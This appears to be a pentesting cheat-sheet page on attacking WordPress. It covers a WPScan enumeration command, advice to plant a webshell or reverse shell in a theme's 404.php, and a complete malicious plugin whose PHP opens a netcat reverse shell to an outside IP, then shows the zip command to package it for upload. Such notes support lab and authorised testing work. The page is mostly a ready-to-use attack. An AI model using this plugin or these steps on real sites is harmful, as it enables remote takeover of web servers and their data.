---
description: Wordpress is maybe the most common CMS on internet.
---

# Wordpress

## WPScan

```text
wpscan --url http://example.com -e ap,at,cb,dbe,u1-5,m1-15 --api-token <APITOKEN>
```

## From Admin to RCE

### Theme Editor

We can modify a theme by adding a reverse shell or a webshell on the 404.php file.

### Installing Plugin

Another way to obtain a reverse shell is to upload and install a plugin. It is important to add the comment lines in order to a successful installation.

```text
<?php
    /*
    Plugin Name: HackinNotes Wordpress Shell
    Plugin URI: https://github.com/leonjza/wordpress-shell
    Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
    Author: Leon Jacobs
    Version: 0.3
    Author URI: https://leonjza.github.io
    */

system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f");?>
```

After that we just need to zip it and install.

```text
zip revshell-plugin.zip revshell-plugin.php
```



